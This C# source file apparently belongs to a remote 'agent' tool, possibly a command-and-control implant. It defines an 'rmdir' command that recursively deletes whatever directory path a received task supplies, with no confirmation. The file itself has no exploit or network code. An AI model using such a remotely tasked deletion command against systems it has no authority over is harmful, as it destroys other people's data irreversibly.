using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class DeleteDirectory : AgentCommand
    {
        public override string Name => "rmdir";

        public override string Execute(AgentTask task)
        {

            if (task.Arguments is null || task.Arguments.Length == 0)
            {
                return "No path provided";
            }

            var path = task.Arguments[0];
            Directory.Delete(path, true);

            if (!Directory.Exists(path))
            {
                return $"{path} deleted";
            }

            return $"Failed to delete {path}";
        }
    }
}
